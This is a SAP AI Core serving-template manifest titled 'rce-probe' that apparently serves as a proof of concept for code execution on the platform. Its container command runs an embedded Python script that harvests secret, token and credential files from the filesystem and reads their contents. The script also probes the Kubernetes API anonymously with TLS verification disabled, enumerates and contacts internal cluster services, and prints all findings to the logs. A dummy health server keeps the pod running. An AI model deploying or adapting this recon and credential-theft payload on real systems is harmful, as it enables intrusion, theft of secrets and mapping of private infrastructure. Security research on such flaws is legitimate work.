apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, subprocess, urllib.request, ssl, json, glob, socket

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            results = {}

            # --- Basic info ---
            results['hostname'] = subprocess.check_output(['hostname']).decode().strip()
            results['id'] = subprocess.check_output(['id']).decode().strip()
            results['uname'] = subprocess.check_output(['uname', '-a']).decode().strip()

            # --- Scan entire filesystem for token/secret files ---
            secret_paths = []
            for pattern in [
                '/run/**','/etc/**secret*','/etc/**token*','/etc/**cred*',
                '/var/**secret*','/var/**token*','/var/**cred*',
                '/secrets/**','/vault/**','/mnt/**secret*','/mnt/**token*',
                '/tmp/**token*','/tmp/**secret*',
            ]:
                try:
                    for f in glob.glob(pattern, recursive=True):
                        if os.path.isfile(f) and os.path.getsize(f) < 10000:
                            secret_paths.append(f)
                except:
                    pass
            results['secret_files'] = secret_paths

            # Read any token files found
            for path in secret_paths:
                try:
                    with open(path) as f:
                        content = f.read(500)
                        if any(x in path.lower() or x in content.lower() for x in ['token', 'secret', 'key', 'cred', 'pass']):
                            results[f'file_{path}'] = content
                except:
                    pass

            # --- Check /proc/net/tcp for active connections / listening ports ---
            try:
                with open('/proc/net/tcp') as f:
                    results['proc_net_tcp'] = f.read()
            except Exception as e:
                results['proc_net_tcp'] = 'ERR: ' + str(e)

            # --- K8s API anonymous access ---
            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
            for path in ['/api', '/api/v1', '/api/v1/namespaces', '/apis', '/version', '/healthz']:
                url = f'https://{k8s_host}:{k8s_port}{path}'
                try:
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                        results[f'k8s_anon{path}'] = r.read(500).decode(errors='replace')
                except Exception as e:
                    results[f'k8s_anon{path}'] = 'ERR: ' + str(e)[:80]

            # --- Try to DNS resolve internal services ---
            internal_names = [
                'kubernetes.default.svc.cluster.local',
                'kube-dns.kube-system.svc.cluster.local',
                'argocd-server.argocd.svc.cluster.local',
                'istio-pilot.istio-system.svc.cluster.local',
                'prometheus.monitoring.svc.cluster.local',
                'grafana.monitoring.svc.cluster.local',
                'aicore-api.default.svc.cluster.local',
                'ai-api.default.svc.cluster.local',
            ]
            dns_results = {}
            for name in internal_names:
                try:
                    ip = socket.gethostbyname(name)
                    dns_results[name] = ip
                except Exception as e:
                    dns_results[name] = 'ERR: ' + str(e)[:50]
            results['dns'] = dns_results

            # --- Try HTTP to resolved services ---
            for name, ip in dns_results.items():
                if not ip.startswith('ERR'):
                    for port in [80, 443, 8080, 8443, 9090]:
                        url = f'https://{ip}:{port}/'
                        try:
                            req = urllib.request.Request(url)
                            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
                                results[f'svc_{name}_{port}'] = r.read(200).decode(errors='replace')
                        except Exception as e:
                            err = str(e)[:40]
                            if 'timed out' not in err and '111' not in err:
                                results[f'svc_{name}_{port}'] = 'ERR: ' + err

            print('[RECON_START]')
            print(json.dumps(results, indent=2, default=str))
            print('[RECON_END]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
